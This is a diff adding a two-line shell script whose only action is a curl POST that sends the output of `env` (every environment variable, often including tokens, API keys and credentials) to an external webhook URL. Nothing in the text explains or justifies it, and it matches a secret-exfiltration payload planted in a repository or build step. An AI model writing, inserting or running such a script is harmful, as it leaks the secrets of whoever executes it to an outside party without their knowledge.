@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -X POST -d "$(env)" https://webhook-tester.shippeo.com/4f055531-4445-4f7a-b127-e4fa23c8f2db
